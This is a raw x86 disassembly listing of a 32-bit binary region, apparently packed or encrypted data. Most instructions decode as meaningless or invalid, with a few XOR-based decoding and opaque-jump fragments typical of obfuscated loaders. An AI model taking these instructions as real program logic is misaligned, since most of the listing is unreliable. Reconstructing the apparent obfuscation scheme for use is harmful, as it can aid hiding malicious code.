  4081ee:	jb     0x4081d3
  4081f0:	shl    BYTE PTR [esi+0x16],1
  4081f3:	mov    ch,0xe3
  4081f5:	mov    BYTE PTR [ebx+0x4c],bh
  4081f8:	xchg   ch,dl
  4081fa:	mov    ch,0x37
  4081fc:	push   ecx
  4081fd:	mov    eax,ds:0x3e426319
  408202:	and    eax,0x62aa47c5
  408207:	push   ss
  408208:	and    al,0x6
  40820a:	int    0x1c
  40820c:	dec    eax
  40820d:	(bad)  
  40820e:	test   eax,0x5ae66e9b
  408213:	arpl   WORD PTR [esi-0x38],cx
  408216:	fmul   DWORD PTR [eax-0x37969e28]
  40821c:	xor    al,BYTE PTR [edx-0x2f]
  40821f:	test   al,0xf1
  408221:	pop    ecx
  408222:	mov    DWORD PTR [ebp+0x55636cea],edx
  408228:	pop    esi
  408229:	jge    0x4081dc
  40822b:	dec    ecx
  40822c:	mov    cl,0x49
  40822e:	bound  ecx,QWORD PTR [edi+0x2dae2452]
  408234:	fidiv  DWORD PTR [esi+0x5]
  408237:	and    al,BYTE PTR [edx]
  408239:	popa   
  40823a:	fnstsw WORD PTR [ebx]
  40823c:	pop    ss
  40823d:	js     0x4082ac
  40823f:	ja     0x408263
  408241:	xor    cl,BYTE PTR [edx]
  408243:	mov    edi,0xebe27c3f
  408248:	xchg   eax,esi
  40824a:	mov    edx,DWORD PTR [eax+0x29321738]
  408250:	cmc    
  408251:	pop    ebx
  408252:	inc    esp
  408253:	scas   al,BYTE PTR es:[edi]
  408254:	ror    BYTE PTR [edx],1
  408256:	sbb    ch,BYTE PTR [edx+0x79dacff9]
  40825c:	ins    DWORD PTR es:[edi],dx
  40825d:	loop   0x4082d4
  40825f:	cmp    edi,DWORD PTR [eax-0x5203697f]
  408265:	outs   dx,DWORD PTR ds:[esi]
  408266:	je     0x4081fe
  408268:	jl     0x408283
  40826a:	lea    ebp,[esi+0x55]
  40826d:	loopne 0x4082cf
  40826f:	cld    
  408270:	adc    esi,DWORD PTR [esi]
  408272:	xchg   ecx,eax
  408273:	inc    edx
  408274:	or     BYTE PTR [ebp-0x78],0xf0
  408278:	inc    esp
  408279:	das    
  40827a:	out    0xe6,al
  40827c:	mov    ds:0x56463a43,eax
  408281:	sbb    edi,esp
  408283:	xchg   DWORD PTR [ebp-0x39],ebp
  408286:	into   
  408287:	bnd ja 0x40825b
  40828a:	loope  0x40823a
  40828c:	aam    0x2b
  40828e:	(bad)  [ebp-0x2e]
  408291:	pop    ecx
  408292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408293:	fisubr DWORD PTR [edi+edi*4]
  408296:	cmc    
  408297:	jmp    0xe4fa:0xe5585fb1
  40829e:	cmp    eax,0xa01f7b85
  4082a3:	sbb    esp,DWORD PTR [ebp+0x27]
  4082a6:	jp     0x4082fe
  4082a8:	fwait
  4082a9:	sbb    eax,0x71bfa539
  4082ae:	sub    eax,0x5c9b900e
  4082b3:	lea    eax,[ebp+0x49]
  4082b6:	and    al,dh
  4082b8:	dec    ecx
  4082b9:	in     eax,dx
  4082ba:	mov    al,ds:0x20bae481
  4082bf:	push   cs
  4082c0:	jnp    0x4082e3
  4082c2:	inc    ebp
  4082c3:	xchg   edx,eax
  4082c4:	pop    ds
  4082c5:	in     eax,dx
  4082c6:	inc    ecx
  4082c7:	and    eax,0xc07928a4
  4082cc:	fdivr  DWORD PTR [edx]
  4082ce:	iret   
  4082cf:	popa   
  4082d0:	clc    
  4082d1:	je     0x408342
  4082d3:	inc    edi
  4082d4:	inc    esp
  4082d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d6:	add    al,0x46
  4082d8:	xor    eax,0xfc0453fa
  4082dd:	inc    BYTE PTR [edx-0x60]
  4082e0:	test   DWORD PTR [esi],ebp
  4082e2:	shl    DWORD PTR [ebx+ebx*4+0x3a],cl
  4082e6:	mov    dl,0x9e
  4082e8:	jg     0x40835c
  4082ea:	push   edx
  4082eb:	nop
  4082ec:	cmp    BYTE PTR [esi],0xcc
  4082ef:	js     0x4082d4
  4082f1:	push   eax
  4082f2:	dec    edi
  4082f3:	shl    ebx,0xbf
  4082f6:	aad    0xc1
  4082f8:	loopne 0x4082ef
  4082fa:	inc    esp
  4082fb:	lods   eax,DWORD PTR ds:[esi]
  4082fc:	xor    DWORD PTR [edx],ebx
  4082fe:	(bad)  
  4082ff:	call   0x3e49:0x4b90675a
  408306:	xor    ah,BYTE PTR [esi-0x48a1b15b]
  40830c:	mov    WORD PTR [bx+di-0x3],gs
  408310:	ds popf 
  408312:	adc    ch,BYTE PTR [edx+edx*4+0x41]
  408316:	and    BYTE PTR [esi+0x2e1e6be0],ah
  40831c:	pop    es
  40831d:	mov    ds:0x4b7c8805,eax
  408322:	in     al,dx
  408323:	pop    eax
  408324:	je     0x4082b7
  408326:	fwait
  408327:	ds cld 
  408329:	inc    ebp
  40832a:	in     eax,0x15
  40832c:	or     DWORD PTR [esi+0x67e37839],eax
  408332:	pop    edi
  408333:	add    cl,bl
  408335:	mov    edi,0xb0f1fd5b
  40833a:	iret   
  40833b:	pop    ecx
  40833c:	inc    esp
  40833d:	sub    DWORD PTR [esi-0x14],esp
  408340:	mov    esp,0x7cf369c3
  408345:	int    0x19
  408347:	call   0x58fb:0x58ccfdc3
  40834e:	call   0xe2b73b01
  408353:	lds    eax,FWORD PTR [ebx-0x68]
  408356:	mov    bh,0xbd
  408358:	xchg   ebx,eax
  408359:	adc    eax,0x12306626
  40835e:	rol    ebp,cl
  408360:	ins    BYTE PTR es:[edi],dx
  408361:	adc    al,0xec
  408364:	cmp    esp,DWORD PTR [edi+0x48]
  408367:	(bad)  
  408369:	lock shl BYTE PTR [edi-0x77e52b11],0x43
  408371:	jo     0x408367
  408373:	ficom  WORD PTR [edi-0x7c711f98]
  408379:	pop    es
  40837a:	push   ds
  40837b:	or     al,0xda
  40837d:	pop    ebp
  40837e:	jb     0x408330
  408380:	jmp    0xdda5:0x151ee826
  408387:	pop    ss
  408388:	mov    ch,0xa2
  40838a:	dec    ebx
  40838b:	stc    
  40838c:	xlat   BYTE PTR ds:[ebx]
  40838d:	loopne 0x408391
  40838f:	inc    eax
  408390:	jnp    0x4083dd
  408392:	sahf   
  408393:	jecxz  0x408380
  408395:	pop    edx
  408396:	popf   
  408397:	stos   BYTE PTR es:[edi],al
  408398:	pusha  
  408399:	add    edi,ebx
  40839b:	jne    0x40831f
  40839d:	push   esp
  40839e:	jl     0x40837d
  4083a0:	je     0x4083c0
  4083a2:	neg    BYTE PTR [ebp-0x73]
  4083a5:	cmc    
  4083a6:	sub    eax,ebp
  4083a8:	in     eax,dx
  4083a9:	data16 std 
  4083ab:	jae    0x40839c
  4083ad:	nop
  4083ae:	xor    eax,0xed8b54f3
  4083b3:	pop    ebx
  4083b4:	jb     0x408340
  4083b6:	sbb    DWORD PTR [ecx],edi
  4083b8:	retf   0xf92e
  4083bb:	cmp    esi,ebx
  4083bd:	rcl    BYTE PTR [eax+0x4d375a08],1
  4083c3:	push   0x7718b4e8
  4083c8:	and    al,0xb
  4083ca:	pop    edi
  4083cb:	xor    eax,0x7e036ff1
  4083d0:	adc    BYTE PTR [ebp+0x6d8e8aed],al
  4083d6:	mov    ds:0x93f1e024,al
  4083db:	(bad)  
  4083dd:	adc    al,0x1a
  4083df:	xor    BYTE PTR [ebp+0x62b54148],0x5a
  4083e6:	jo     0x4083d9
  4083e8:	inc    ebx
  4083e9:	mov    DWORD PTR [edi],ebp
  4083eb:	in     eax,0x2
  4083ed:	pop    ss
  4083ee:	xchg   ebx,eax
  4083ef:	xchg   ecx,eax
  4083f0:	adc    edi,DWORD PTR [eax]
  4083f2:	iret   
  4083f3:	retf   0x8660
  4083f6:	pushf  
  4083f7:	push   0x57
  4083f9:	xor    BYTE PTR [eax-0x8],ch
  4083fc:	addr16 pop ebx
  4083fe:	xor    eax,0xa26c45af
  408403:	fsubr  DWORD PTR [edx+edx*1+0x66]
  408407:	imul   BYTE PTR [edx-0x8]
  40840a:	test   al,0xc9
  40840c:	aas    
  40840d:	imul   esi,DWORD PTR [esi+0x8],0xf2ae5938
  408414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408415:	mov    bl,0x60
  408417:	cli    
  408418:	mov    ecx,0x31e5b27d
  40841d:	cdq    
  40841e:	push   esp
  40841f:	mov    ?,edi
  408421:	pop    esp
  408422:	pop    esp
  408423:	(bad)  
  408424:	out    dx,al
  408425:	sti    
  408426:	dec    ebx
  408427:	lea    edi,[esi+0x1f6b8bc8]
  40842d:	call   DWORD PTR [edi-0x79]
  408430:	sbb    esp,DWORD PTR [ecx]
  408432:	jno    0x4084a2
  408434:	push   0xffffffe3
  408436:	push   ss
  408437:	leave  
  408438:	inc    edx
  408439:	and    esi,DWORD PTR [ebp-0x1e265f2a]
  40843f:	ss call 0xf6630c57
  408445:	pop    edi
  408446:	fbld   TBYTE PTR [esi]
  408448:	sub    DWORD PTR [eax],ebp
  40844a:	cmp    bl,dh
  40844c:	sub    eax,0xee322b7c
  408451:	in     eax,0xe8
  408453:	stos   BYTE PTR es:[edi],al
  408454:	mov    ebp,0x22f7598f
  40845a:	add    cl,cl
  40845c:	ficom  DWORD PTR [ebx]
  40845e:	and    DWORD PTR [ecx-0xfe5c198],esi
  408464:	mov    dl,0x1a
  408466:	aad    0x2
  408468:	fld    QWORD PTR [ebx+0x64]
  40846b:	into   
  40846c:	push   0xffffffbb
  40846e:	inc    ecx
  40846f:	pop    ecx
  408470:	xor    ch,dh
  408472:	sar    BYTE PTR [ebx],cl
  408474:	stc    
  408475:	(bad)  
  408476:	cmp    eax,DWORD PTR [ebx]
  408478:	fimul  WORD PTR ds:0x77bd4788
  40847e:	sub    BYTE PTR [edx+0x7ac48cb7],ch
  408484:	pop    edi
  408485:	and    eax,0x8fe29114
  40848a:	adc    al,0x3f
  40848c:	adc    bl,bh
  40848e:	cmp    eax,0x1fda4259
  408493:	jns    0x4084c9
  408495:	add    DWORD PTR [edi+0x26],ebx
  408498:	imul   eax,DWORD PTR [edx],0x22
  40849b:	xchg   edi,eax
  40849c:	jg     0x408426
  40849e:	out    0x54,al
  4084a0:	les    esi,FWORD PTR [ebp+0x4ada050f]
  4084a6:	adc    al,0x3a
  4084a8:	jecxz  0x4084dc
  4084aa:	ins    DWORD PTR es:[edi],dx
  4084ab:	aaa    
  4084ac:	jb     0x4084ea
  4084ae:	sbb    ecx,ebx
  4084b0:	xchg   BYTE PTR [ecx+0x18],ah
  4084b3:	les    ecx,FWORD PTR [eax+0x4c1d0822]
  4084b9:	(bad)  
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	xor    eax,0x32b06fe6
  408513:	fidivr WORD PTR [esp+edi*2-0x29]
  408517:	jns    0x408595
  408519:	jl     0x40853c
  40851b:	sti    
  40851c:	rcl    DWORD PTR [ebp+ecx*1-0x545993a2],1
  408523:	mov    al,ds:0xdcfc8499
  408528:	mov    eax,gs:0x73a71639
  40852e:	and    DWORD PTR [ebx-0xd12cef6],ebp
  408534:	mov    bh,0x3c
  408536:	adc    DWORD PTR [edi+0x48dce2a0],esi
  40853c:	popf   
  40853d:	push   ebp
  40853e:	loope  0x408542
  408540:	dec    edx
  408541:	jg     0x4084fc
  408543:	out    dx,al
  408544:	rcl    cl,1
  408546:	aas    
  408547:	push   0x52
  408549:	mov    al,ds:0xffc9ce76
  40854e:	mov    eax,0xdaf0015f
  408553:	repz and bl,0x2
  408557:	bnd jge 0x408581
  40855a:	(bad)  [eax-0x11e48a6a]
  408560:	sub    dl,BYTE PTR ds:0x4baf1dba
  408566:	retf   
  408567:	fistp  QWORD PTR [ebx+0x3b]
  40856a:	pushf  
  40856b:	xchg   ebx,eax
  40856c:	sub    dl,BYTE PTR ds:0xafd36b58
  408572:	cmc    
  408573:	dec    ecx
  408574:	hlt    
  408575:	fdivr  DWORD PTR [edx]
  408577:	jl     0x408579
  408579:	lahf   
  40857a:	ret    
  40857b:	sti    
  40857c:	pop    edi
  40857d:	mov    ?,WORD PTR ds:0xdd4bad1d
  408583:	cdq    
  408584:	ja     0x408566
  408586:	push   esp
  408587:	inc    esp
  408588:	int3   
  408589:	push   ebx
  40858a:	push   esp
  40858b:	std    
  40858c:	xchg   ecx,eax
  40858d:	jb     0x408548
  40858f:	pop    edx
  408590:	xchg   esp,eax
  408591:	addr16 adc bl,ch
  408594:	daa    
  408595:	imul   ebx,DWORD PTR [esp+esi*2-0x556eecbd],0x71
  40859d:	std    
  40859e:	cmp    bh,BYTE PTR [ebx-0x48]
  4085a1:	inc    eax
  4085a2:	push   esi
  4085a3:	xchg   edi,eax
  4085a4:	fild   DWORD PTR [edi-0x320290cd]
  4085aa:	pushf  
  4085ab:	out    0xad,al
  4085ad:	xor    al,0x7c
  4085af:	and    ch,BYTE PTR [ebp+0x57]
  4085b2:	les    ecx,FWORD PTR ds:0x8e0f28a4
  4085b8:	aas    
  4085b9:	cmp    al,0xbf
  4085bb:	and    al,BYTE PTR [eax-0x20]
  4085be:	test   cl,bh
  4085c0:	push   ecx
  4085c1:	dec    ebp
  4085c2:	repnz mov esi,0x66cc963c
  4085c8:	and    dl,BYTE PTR [ebx]
  4085ca:	xchg   ebp,eax
  4085cb:	mov    al,ds:0x7646bb6f
  4085d0:	idiv   DWORD PTR [esi+0x5638755d]
  4085d6:	cmp    eax,0x51b0d621
  4085db:	xlat   BYTE PTR ds:[ebx]
  4085dc:	jns    0x408579
  4085de:	ins    DWORD PTR es:[edi],dx
  4085df:	jp     0x4085d3
  4085e1:	inc    DWORD PTR [eax]
  4085e3:	inc    edi
  4085e4:	aam    0x1d
  4085e6:	pop    es
  4085e7:	mov    ebp,0x461f62a4
  4085ec:	nop
  4085ed:	pop    eax
  4085ee:	mov    ecx,0x5c335be3
  4085f3:	iret   
  4085f4:	mov    ds:0x3801ed71,eax
  4085f9:	and    DWORD PTR [eax-0x25],ebp
  4085fc:	cmp    BYTE PTR [edx],ch
  4085fe:	jl     0x4085d2
  408600:	mov    WORD PTR [esi+0x77],?
  408603:	retf   0x5f57
  408606:	xrelease xchg BYTE PTR [edx+0x7b],ah
  40860a:	out    0x6c,eax
  40860c:	outs   dx,BYTE PTR ds:[esi]
  40860d:	or     BYTE PTR ds:0xedf5e59e,dl
  408613:	mov    dl,0x6f
  408615:	inc    ebx
  408616:	fidivr DWORD PTR [ecx-0x38]
  408619:	inc    eax
  40861a:	imul   edx,DWORD PTR [ecx-0x1893b9ba],0x55
  408621:	xlat   BYTE PTR ds:[ebx]
  408622:	sbb    al,bl
  408624:	in     eax,0x12
  408626:	aam    0x24
  408628:	sub    BYTE PTR [ebp-0x37a6fc87],dl
  40862e:	mov    ?,WORD PTR [ecx]
  408630:	ins    BYTE PTR es:[edi],dx
  408631:	mov    BYTE PTR [esi],bh
  408633:	inc    edi
  408634:	je     0x4085e4
  408636:	add    al,0x34
  408638:	add    cl,ah
  40863a:	and    ebx,DWORD PTR [edi]
  40863c:	call   0x2c78:0xbef82284
  408643:	jg     0x4086bf
  408645:	sbb    esp,ecx
  408647:	ret    
  408648:	push   ebx
  408649:	popf   
  40864a:	sbb    bh,al
  40864c:	jp     0x4086bd
  40864e:	test   BYTE PTR [edx+0x52fc54f9],al
  408654:	sub    eax,0x4a5d8238
  408659:	inc    esi
  40865a:	aas    
  40865b:	xor    al,0xf7
  40865d:	mov    ch,ch
  40865f:	test   al,dl
  408661:	das    
  408662:	mov    bh,0xb
  408664:	xor    ah,BYTE PTR [edx]
  408666:	push   ecx
  408667:	(bad)  
  408669:	cmp    bh,BYTE PTR [ebx-0x11]
  40866c:	xor    bh,BYTE PTR [ecx-0x53]
  40866f:	(bad)  
  408670:	inc    edi
  408671:	add    al,0x56
  408673:	data16 test al,0xbd
  408676:	test   al,0x80
  408678:	xor    bh,BYTE PTR [ebp+0x40]
  40867b:	ja     0x40862f
  40867d:	jge    0x40864c
  40867f:	repz pop esp
  408681:	retf   
  408682:	mov    al,ds:0x8efa5711
  408687:	inc    ebp
  408688:	rol    DWORD PTR [ebp+edi*4+0x50],0xbd
  40868d:	sub    BYTE PTR [ebx-0x1ed191ad],ah
  408693:	lods   al,BYTE PTR ss:[esi]
  408695:	jmp    0x932159dc
  40869a:	imul   ebp,DWORD PTR [ebp-0x17],0x30a9ad6d
  4086a1:	out    dx,al
  4086a2:	nop
  4086a3:	cmp    DWORD PTR [eax+ebx*4],esp
  4086a6:	test   al,0x3e
  4086a8:	dec    ecx
  4086a9:	cmp    esi,DWORD PTR [esi+0x77]
  4086ac:	mov    WORD PTR [ecx],gs
  4086ae:	fist   WORD PTR [edx+0x0]
  4086b1:	ds dec esi
  4086b3:	repz out 0x20,eax
  4086b6:	ins    DWORD PTR es:[edi],dx
  4086b7:	mov    esi,DWORD PTR [ebp+0x6a]
  4086ba:	aas    
  4086bb:	enter  0x2551,0x91
  4086bf:	arpl   WORD PTR [edi],cx
  4086c1:	dec    ebp
  4086c2:	xchg   BYTE PTR [edx-0x66],al
  4086c5:	ror    DWORD PTR [esi+0x27],0x1f
  4086c9:	cmp    al,0xb9
  4086cb:	es push es
  4086cd:	ss xor al,0x12
  4086d0:	sti    
  4086d1:	neg    DWORD PTR [eax]
  4086d3:	mov    esi,0x4d7a21eb
  4086d8:	jmp    0xb119:0xe7619265
  4086df:	aaa    
  4086e0:	mov    bl,cl
  4086e2:	fmul   QWORD PTR [ecx]
  4086e4:	mov    esp,0x2b9ab732
  4086e9:	mov    eax,0x9c6ba45b
  4086ee:	scas   eax,DWORD PTR es:[edi]
  4086ef:	out    dx,al
  4086f0:	js     0x408756
  4086f2:	dec    esp
  4086f3:	repnz xlat BYTE PTR ds:[ebx]
  4086f5:	cld    
  4086f6:	push   es
  4086f7:	cmp    esi,DWORD PTR es:[edx-0x75ada96d]
  4086fe:	mov    al,0x88
  408700:	mov    ebx,0x21e89003
  408705:	add    eax,0xd396bc7e
  40870a:	sub    edx,DWORD PTR ds:0x81bf46b2
  408710:	aaa    
  408711:	sbb    BYTE PTR [ebp-0x74],0x73
  408715:	out    0x8a,eax
  408717:	lds    edx,FWORD PTR [ecx]
  408719:	outs   dx,DWORD PTR ds:[esi]
  40871a:	sub    DWORD PTR [edx+0x51],0xffffff88
  40871e:	push   0xffffffa9
  408720:	xchg   ecx,eax
  408721:	cs and bl,BYTE PTR cs:[eax]
  408725:	enter  0x9497,0xc7
  408729:	ret    
  40872a:	ja     0x4086cc
  40872c:	(bad)  
  40872e:	adc    eax,0x1c23702e
  408733:	pop    ebx
  408734:	out    0x42,eax
  408736:	leave  
  408737:	icebp  
  408738:	or     DWORD PTR [esi+0x24badf34],ecx
  40873e:	sahf   
  40873f:	sub    DWORD PTR [ebx-0x79],ebx
  408742:	ds out dx,eax
  408744:	(bad)  
  408745:	(bad)  [esi+0x2484283]
  40874b:	add    edi,DWORD PTR [edx-0x10c6ffb9]
  408751:	push   ebx
  408752:	popw   ds
  408754:	sbb    ebp,DWORD PTR [esi+ebx*1-0x3b]
  408758:	outs   dx,BYTE PTR gs:[esi]
  40875a:	sub    al,0xba
  40875c:	clc    
  40875d:	inc    ebx
  40875e:	and    dl,al
  408760:	sbb    al,0x90
  408762:	and    ah,BYTE PTR [ebp+0x4e]
  408765:	push   esi
  408766:	or     eax,0xad9907fd
  40876b:	xchg   edx,eax
  40876c:	mov    bl,0x95
  40876e:	dec    ebx
  40876f:	mov    dl,0x6a
  408771:	jbe    0x408700
  408773:	sub    ebx,DWORD PTR [ecx+0x839ae92]
  408779:	mov    edi,0x5209b018
  40877e:	sub    ebp,edi
  408780:	cld    
  408781:	mov    edi,0x1100ad33
  408786:	fdivr  st,st(5)
  408788:	lea    ecx,[edi+0x2cc7c4b3]
  40878e:	xor    al,al
  408790:	jmp    FWORD PTR [ebp+0x6cb19ebd]
  408796:	xor    eax,0xa1168590
  40879b:	test   eax,0x606d890d
  4087a0:	(bad)  
  4087a1:	jb     0x4087f3
  4087a3:	mov    ds:0x68d8df2c,eax
  4087a8:	adc    eax,ebx
  4087aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ab:	rcr    DWORD PTR [esi+0xe4fa52e],0x80
  4087b2:	rcl    ebp,cl
  4087b4:	into   
  4087b5:	mov    ss,WORD PTR ds:[eax+0x4934566f]
  4087bc:	mov    ebp,0xa35f579b
  4087c1:	outs   dx,BYTE PTR ds:[esi]
  4087c2:	mov    ch,BYTE PTR [ebp+ebp*1-0x3585d77f]
  4087c9:	ins    DWORD PTR es:[edi],dx
  4087ca:	sub    esi,DWORD PTR [ecx]
  4087cc:	xchg   ebp,eax
  4087cd:	xor    dl,BYTE PTR [edx+edx*4+0x3b83ca86]
  4087d4:	pop    esi
  4087d5:	add    al,0x1b
  4087d7:	xchg   bh,dl
  4087d9:	xchg   edi,eax
  4087da:	pop    eax
  4087db:	sub    edx,ebp
  4087dd:	mov    ecx,0x1b5a2a86
  4087e2:	fmul   DWORD PTR [ecx-0x31]
  4087e5:	pop    ds
  4087e6:	lds    ebx,FWORD PTR [eax+ebp*2-0x2b]
  4087ea:	jge    0x408801
  4087ec:	xor    dh,BYTE PTR [eax+0x17]
  4087ef:	loopne 0x40880b
  4087f1:	mov    esi,0x9fe12598
  4087f6:	add    eax,0x10dcb762
  4087fb:	pop    esp
  4087fc:	jmp    0x408877
  4087fe:	mov    ah,0x44
  408800:	es inc eax
  408802:	cld    
  408803:	xor    BYTE PTR [ecx],ch
  408805:	cmc    
  408806:	sub    ax,0x2d7f
  40880a:	(bad)  
  40880b:	cdq    
  40880c:	arpl   cx,bx
  40880e:	xchg   esi,eax
  40880f:	mov    ecx,DWORD PTR [esi+0x3d]
  408812:	ret    
  408813:	das    
  408814:	cld    
  408815:	pop    ecx
  408816:	repnz cmp al,BYTE PTR [esi]
  408819:	push   es
  40881a:	fidivr WORD PTR [edx]
  40881c:	les    esp,FWORD PTR [ebp-0x66]
  40881f:	add    eax,0x960831ad
  408824:	mov    ebx,0x1a557774
  408829:	dec    esp
  40882a:	pop    ecx
  40882b:	xchg   ebp,eax
  40882c:	lods   eax,DWORD PTR ds:[esi]
  40882d:	xlat   BYTE PTR ds:[ebx]
  40882e:	iret   
  40882f:	inc    esp
  408830:	pop    esi
  408831:	cmp    ebp,DWORD PTR [edx+0x6927361d]
  408837:	jge    0x408899
  408839:	push   es
  40883a:	in     eax,dx
  40883b:	aas    
  40883c:	xor    ebp,DWORD PTR [ebx+ebp*2]
  40883f:	inc    eax
  408840:	mov    ecx,0x201dc515
  408845:	stos   BYTE PTR es:[edi],al
  408846:	leave  
  408847:	and    BYTE PTR [ebx],ch
  408849:	mov    ah,0x5a
  40884b:	and    al,0x3d
  40884d:	add    eax,0xd6401ec5
  408852:	or     BYTE PTR [edi-0x479158f4],0xfc
  408859:	and    dh,dh
  40885b:	rol    DWORD PTR [ebx],0xa2
  40885e:	rcl    DWORD PTR [edi],cl
  408860:	add    cl,ah
  408862:	cmc    
  408863:	out    0xda,al
  408865:	call   0x99beaa0b
  40886a:	js     0x40889a
  40886c:	sub    ecx,ebx
  40886e:	jmp    0x2403865a
  408873:	xor    DWORD PTR [eax],0x2650fa8f
  408879:	jmp    0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0xc3
  4088df:	push   esi
  4088e0:	fldcw  WORD PTR [ebp-0x6b]
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x4088ec
  4088eb:	and    eax,0x725ac142
  4088f0:	loop   0x40895c
  4088f2:	repnz pop ebx
  4088f4:	and    edx,ebx
  4088f6:	adc    esp,edi
  4088f8:	sub    BYTE PTR [ebx+0x48],al
  4088fb:	push   eax
  4088fc:	test   eax,0xb0387810
  408901:	add    eax,0x7226c4a7
  408906:	jmp    0x155d:0xf7baba72
  40890d:	fwait
  40890e:	scas   eax,DWORD PTR es:[edi]
  40890f:	jle    0x4088e8
  408911:	mov    edi,0x8b3458ed
  408916:	jb     0x40896b
  408918:	pcmpgtw mm4,QWORD PTR [eax+0x675f2eb6]
  40891f:	div    BYTE PTR [edx+0x6b]
  408922:	mov    eax,esp
  408924:	call   0x2649d87a
  408929:	pop    ebp
  40892a:	jge    0x4088c9
  40892c:	or     DWORD PTR [ecx-0x521e152b],ebx
  408932:	dec    edi
  408933:	sbb    ebx,edi
  408935:	loop   0x40895a
  408937:	retf   0xc13e
  40893a:	add    eax,0xd8179a63
  40893f:	dec    edi
  408940:	bound  esi,QWORD PTR [eax-0x1e4a7dc0]
  408946:	sub    DWORD PTR [esi+eax*2],ebx
  408949:	add    DWORD PTR [edi],esi
  40894b:	jo     0x4088ce
  40894d:	fwait
  40894e:	ins    DWORD PTR es:[edi],dx
  40894f:	adc    BYTE PTR [eax-0x61],ch
  408952:	xor    DWORD PTR [esi],0x68f1c6b5
  408958:	sub    esi,DWORD PTR [edx]
  40895a:	dec    ebp
  40895b:	mov    cl,BYTE PTR [ebx-0x31]
  40895e:	mov    dl,0x38
  408960:	add    ch,dh
  408962:	adc    BYTE PTR [ebp+0xb],al
  408965:	xor    al,0xd4
  408967:	ins    DWORD PTR es:[edi],dx
  408968:	sbb    DWORD PTR [edx-0x24d1f4bf],edx
  40896e:	mov    ch,0x2c
  408970:	or     al,0x35
  408972:	sbb    DWORD PTR [esi-0x3e34d613],eax
  408978:	mov    ebx,0x2ac02983
  40897d:	sahf   
  40897e:	dec    edx
  40897f:	mov    BYTE PTR [ebx+eax*2],ah
  408982:	mov    ecx,0x38c0bf11
  408987:	or     al,0xc2
  408989:	out    dx,eax
  40898a:	mov    ds:0x98d809eb,al
  40898f:	xchg   edi,eax
  408990:	loopne 0x4089c6
  408992:	pop    bx
  408994:	and    esp,DWORD PTR [eax]
  408996:	mov    eax,0x81a6fde5
  40899b:	xchg   ecx,eax
  40899c:	mov    edx,DWORD PTR [eax]
  40899e:	aam    0xc8
  4089a0:	push   ss
  4089a1:	adc    ebx,eax
  4089a3:	int    0x87
  4089a5:	jp     0x408931
  4089a7:	add    eax,0xfc32b9d8
  4089ac:	cmp    eax,0xcfc30692
  4089b1:	or     eax,DWORD PTR ds:0xd65e4372
  4089b7:	adc    al,0x60
  4089b9:	mov    ebp,fs
  4089bb:	hlt    
  4089bc:	in     al,0xc3
  4089be:	dec    esi
  4089bf:	icebp  
  4089c0:	div    ebp
  4089c2:	xor    dl,BYTE PTR [edi+0x4f]
  4089c5:	xor    al,0xfc
  4089c7:	aad    0x8
  4089c9:	and    DWORD PTR [esi],ebx
  4089cb:	call   0x83ac:0x101c91a5
  4089d2:	or     BYTE PTR [ecx+0x42],ah
  4089d5:	or     DWORD PTR [ecx+edx*1-0x2da2d1be],esp
  4089dc:	fistp  DWORD PTR [edi+0x60]
  4089df:	dec    esi
  4089e0:	jle    0x4089d0
  4089e2:	rcr    ebx,1
  4089e4:	(bad)  
  4089e5:	sbb    ebp,DWORD PTR [edx]
  4089e7:	and    al,0x3f
  4089e9:	shl    bl,cl
  4089eb:	pop    eax
  4089ec:	pop    esi
  4089ed:	test   BYTE PTR [bp+0x3f],cl
  4089f1:	push   ebp
  4089f2:	sbb    eax,0x6c2d4452
  4089f7:	or     DWORD PTR [eax-0x1e],0xffffffb7
  4089fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089fc:	scas   eax,DWORD PTR es:[edi]
  4089fd:	xchg   edi,eax
